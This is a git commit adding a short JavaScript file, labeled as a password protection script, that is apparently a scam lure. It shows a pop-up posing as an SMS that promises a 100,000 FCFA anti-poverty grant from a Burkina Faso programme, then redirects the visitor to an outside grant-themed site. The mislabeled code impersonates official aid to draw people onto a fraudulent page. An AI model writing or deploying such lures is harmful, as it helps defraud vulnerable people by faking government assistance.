a886137f18ded5e0ec7a9029ab3350432c53e93b
The-On-going <sirpeelawson@gmail.com>
2026-01-23 06:26:27 +0100

    Create activec.js

---
+++ activec.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible à la subvention de 100 000 FCFA du programme BURKINA-NAONG-SA YA 2026 pour la lutte contre la pauvreté. Veuillez cliquer sur OK pour la recevoir immédiatement.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://ongoing-grant.info/Burkina-Naong-Sa.html';
+  }
